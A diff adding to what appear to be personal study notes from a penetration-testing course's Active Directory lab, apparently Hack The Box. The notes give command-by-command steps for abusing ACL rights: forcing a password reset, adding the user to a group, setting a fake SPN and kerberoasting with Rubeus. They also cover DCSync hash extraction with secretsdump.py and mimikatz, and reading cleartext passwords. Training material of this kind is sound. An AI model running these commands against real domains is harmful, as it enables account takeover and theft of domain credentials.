@@ -74,3 +74,128 @@ foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_us
 ```
 
 ***Loop Through this process as needed***
+## Abusing ACL 
+### Example Attack
+#### Authenticate as the initial user
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\<user>', $SecPassword) 
+```
+#### Leverage GenericAll right
+Create a secure string that will represent the password for the target user 
+```powershell
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+
+Change the Users Password
+```powershell
+ Import-Module .\PowerView.ps1
+```
+
+```powershell
+ Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+```
+#### Authenticate as new user
+```powershell
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+```
+#### Add User to the target group
+List users 
+```powershell
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+```
+
+```powershell
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+```
+Confirm addition 
+```powershell
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+```
+
+#### Perform kerbroasting on target user 
+Create a fake SPN 
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+Crack the hash
+
+#### Clean up 
+Remove the fake SPN 
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+```
+Remove the user from the group 
+```powershell
+PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+```
+
+```powershell
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+Reset the password 
+
+## DCSync
+### Description
+Technique for stealing AD password databases using the Directory Replication Service Remote Protocol
+Allows an attacker to mimic a DC to retrieve NTLM 
+
+Need to have rights to perform domain replication.
+	Replicating Directory Changes and Replicating Directory Changes All permissions set.
+	Domain/Enterprise Admins and default domain administrators have this right by default.
+### View Rights 
+![[Pasted image 20230817141837.png]]
+
+```powershell
+Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+```
+**or**
+Do this in powerview using [Get-ObjectACL](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/)
+```powershell
+$sid= "<users SID>"
+```
+
+```powershell
+> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+```
+
+### Extracting Hashes using Secrets Dump
+```shell
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+```
+Optional flags:
+	-just-dc-ntlm
+	-just-dc-user
+	-pwd-last-set
+	-history
+	-user-status
+
+If we see ..cleartext, this is accounts with [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)
+Key to decrypt the RC4 is stored in the [registry](https://learn.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)
+#### View users with reversible encryption
+```powershell
+ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+```
+Check for options
+```powershell
+ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
+Display the password 
+```shell
+cat inlanefreight_hashes.ntds.cleartext 
+```
+### Using MimiKatz
+```cmd
+.\mimikatz.exe
+```
+
+```cmd
+sadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
